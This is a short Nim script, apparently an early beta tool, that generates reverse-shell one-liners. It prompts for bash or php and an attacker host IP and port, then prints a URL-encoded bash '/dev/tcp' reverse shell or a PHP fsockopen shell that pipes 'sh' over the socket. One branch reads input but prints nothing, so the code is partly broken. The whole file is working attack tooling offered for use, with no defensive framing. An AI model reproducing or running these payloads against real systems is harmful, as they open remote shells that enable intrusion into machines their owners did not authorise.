# 25/04/23

echo """
██████╗░███████╗██╗░░░██╗  ░█████╗░██████╗░██████╗░██╗████████╗
██╔══██╗██╔════╝██║░░░██║  ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝
██████╔╝█████╗░░╚██╗░██╔╝  ██║░░██║██████╔╝██████╦╝██║░░░██║░░░
██╔══██╗██╔══╝░░░╚████╔╝░  ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░
██║░░██║███████╗░░╚██╔╝░░  ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░░

Welcome to revshell to shell 
v0.1 = beta version
"""

# ------------------------------
echo "choose -- bash/php"

var
    options: string = readLine(stdin)
    ip_addr, port: string

proc choose(a: string): string =
    case a
    of "bash":
        echo "url encode? -- Yes/No"
        let code: string = readLine(stdin)
        if code == "Yes":
            (echo "hosted ip:"; ip_addr = readLine(stdin)); (echo "hosted port:"; port = readLine(stdin))
            echo "copy rev generated: bash -c 'bash -i >%26 /dev/tcp/"&ip_addr&"/"&port&" 0>%261' "
        elif code == "No":
            echo "hosted ip:"
            ip_addr = readLine(stdin)
            echo "hosted port"
            port = readLine(stdin)
    of "php":
        (echo "hosted ip:"; ip_addr = readLine(stdin)); (echo "hosted port:"; port = readLine(stdin))
        let payload = "php -r '$sock=fsockopen(\"" & ip_addr & "\"," & $port & "); exec(\"sh <&3 >&3 2>&3\");'"
        echo "copy: ",payload

echo choose(options)
